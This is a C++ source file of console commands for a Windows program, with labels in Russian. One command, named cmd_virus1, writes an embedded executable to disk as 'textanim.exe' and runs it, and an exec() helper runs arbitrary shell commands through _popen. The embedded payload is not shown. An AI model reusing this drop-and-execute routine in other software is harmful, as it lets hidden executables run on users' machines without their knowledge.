#include "main.h"

void cmd_virus1(const char* args)
{    
    ExtractRes(IDR_EXE1, _T("EXE"), "textanim.exe");
    if (fsm->FileExist("textanim.exe"))
    {
        ShellExecuteA(0, "open", "textanim.exe", 0, 0, SW_SHOWNORMAL);
    }
};


void cmd_exit(const char* args)
{
	//abort();
    ExitProcess(0);
};
void cmd_help(const char* args)
{
	sn->con.AddLog("Список Команд:");
	for (int i = 0; i < sn->con.Commands.Size; i++)
	{
		sn->con.AddLog("-> %s - %s", sn->con.Commands[i]->name, sn->con.Commands[i]->description);
	}
};
void cmd_cleanjc(const char* args)
{    
};

void cmd_cls(const char* args) 
{
    sn->con.ClearLog();
    sn->con.AddLog("{FF0000}Консоль Очищена!");///Красный цвет
};

void cmd_getfilelist(const char* args)
{
    GetListFiles(GetExePath().c_str());
};

void cmd_odir(const char* args)
{    
    const char* edit = GetExePath().c_str();
    ShellExecuteA(NULL, "explore", edit, NULL, NULL, SW_SHOWNORMAL);
};

void cmd_getexename(const char* args) {
    sn->con.AddLog(u8"%s", getFileNameWithoutExtension(GetExeName().c_str()).c_str());
}

void cmd_getexenameext(const char* args) 
{
    sn->con.AddLog(u8"%s", getFileNameWithExtension(GetExeName().c_str()).c_str());
}

std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;            
        }
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }    
    _pclose(pipe);   
    return result;    
}

